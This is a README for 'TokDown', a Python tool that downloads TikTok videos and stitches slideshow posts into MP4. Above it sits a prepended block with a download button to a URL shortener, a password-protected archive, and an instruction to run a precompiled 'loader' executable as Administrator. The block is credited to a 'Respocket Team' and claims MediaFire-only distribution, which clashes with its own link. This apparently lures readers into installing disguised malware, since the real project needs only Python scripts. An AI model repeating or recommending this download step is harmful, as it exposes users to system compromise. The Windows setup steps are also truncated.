<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# TokDown

Download TikTok videos, photo/slideshow posts, and whole accounts — with real Slideshow-to-Video support.

TikTok slideshow posts (the ones made of photos instead of a video) don't
work with normal downloaders, since TikTok doesn't actually store them as a
video file at all. TokDown handles those properly: it fetches the real
images and audio, then stitches them into an MP4 for you automatically —
or, if you'd rather have the raw images and audio track separately, one
checkbox switches to that instead.
## Features

- **Videos** — paste a single video link, or a whole profile/account URL
  and every video on it gets queued up automatically.
- **Photo/slideshow posts** — fetched properly (not just downloaded as an
  audio file, which is what most tools do) and stitched into a slideshow
  video with the original background audio.
- **"Image(s) Only?" mode** — skip the video stitching and just save the
  raw images + audio track instead.
- **Remembers your last download folder** between launches.
- **Keeps a log of everything**, plus a separate error log you can attach
  to a bug report if something goes wrong.

## Requirements

- **Python 3.10+**
- **ffmpeg** — only needed for the default "stitch into a video" mode.
  Without it, slideshow posts still work, they just save as raw images +
  audio instead of a video.
- Everything else (yt-dlp, the browser TokDown uses for slideshow posts,
  etc.) gets installed automatically by the setup script below — you don't
  need to install these yourself.

## Setup

### Windows

1. **Install Python**, if you don't already have it:
### macOS / Linux

1. Make sure Python 3 is installed (macOS and most Linux distros already
   have it — check with `python3 --version` in a terminal).

2. Download or clone this project, open a terminal in that folder, and
   run:
   ```
   bash setup.sh
   ```
   This creates a private Python environment for TokDown, installs what
   it needs, and downloads the browser component used for slideshow
   posts. Takes a few minutes.

3. Install ffmpeg (optional, but recommended — see Requirements above):
   ```
   # macOS
   brew install ffmpeg

   # Debian/Ubuntu
   sudo apt install ffmpeg

   # Fedora
   sudo dnf install ffmpeg

   # Arch
   sudo pacman -S ffmpeg
   ```

4. Run TokDown:
   ```
   ./TokDown.py
   ```

## How to use it

1. **Paste links** into the box at the top — one per line. You can mix:
   - a single video link
   - a single photo/slideshow post link
   - a full profile/account link (every post on that account gets queued)

   Tip: paste one link, and the cursor automatically drops to a new
   blank line — you can just paste the next one right away without
   pressing Enter in between.

2. **Choose where downloads go** with the **Output** field and **Browse**
   button. Defaults to a `TikToks` folder next to the app, and whatever
   you pick is remembered for next time.

3. **"Image(s) Only?"** — leave this **unchecked** (the default) to get
   slideshow posts as a proper stitched MP4 video. Check it if you'd
   rather have the raw images and audio track saved separately instead,
   with no video created.

4. Click **Download**. Progress and status show up in the **Download
   Log** at the bottom as it goes. **Stop** cancels the current run.

Everything downloaded is organized into a subfolder per account. In the
default stitching mode, a slideshow post's finished video is all you'll
see there — the raw images used to build it are cleaned up automatically
once it's done. With "Image(s) Only?" checked (or if ffmpeg isn't
installed), you'll instead find a subfolder with the individual images
and audio track.

## Troubleshooting

**"Missing 'curl-cffi'" / "Missing 'camoufox'" / "Missing 'ffmpeg'"**
Setup didn't finish, or ffmpeg wasn't installed separately (see Setup
above). Re-run `setup.bat` / `setup.sh` — it's safe to run again, it
won't redo work that's already done.

**A specific post keeps failing, or slideshow posts won't fetch at all**
TikTok occasionally shows a CAPTCHA challenge to automated tools if
they're used very heavily in a short time on the same account — this is
TikTok's own anti-bot system, not a bug. TokDown already keeps a
consistent browser identity between runs specifically to avoid this, so
it should be rare; if it happens, waiting a while before retrying that
account usually resolves it. Posts that couldn't be fetched are listed in
`tokdown_failed_links.txt` / `tokdown_skipped_slideshows.txt` in your
output folder so you can retry just those later.

**Windows: `setup.bat` says it can't find Python**
See the "Add python.exe to PATH" note in the Windows setup steps above —
that's almost always the cause.

**Windows: installed ffmpeg but TokDown still says it's missing**
Close and reopen the terminal / restart TokDown (or your PC) — see the
ffmpeg note in the Windows setup steps above.

**Something else went wrong / reporting a bug**
Check `TokDown_error_log.txt`, created next to the app and reset fresh
every time you launch it. It captures every error TokDown hits, plus the
full details of any crash. If you're filing a GitHub issue, attach this
file as-is — it's the fastest way to get a problem diagnosed without back
and forth.

## Notes

- `TokDown_Venv/` and `TokDown_Profile/` are created automatically and
  shouldn't be committed if you fork this — they're local environment and
  browser-profile data, not part of the app itself.
- `TokDown_Profile/` in particular holds real browser session data used
  to avoid the CAPTCHA issue mentioned above — don't share it.


---

MIT License

Copyright (c) 2026 reveler-hub

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
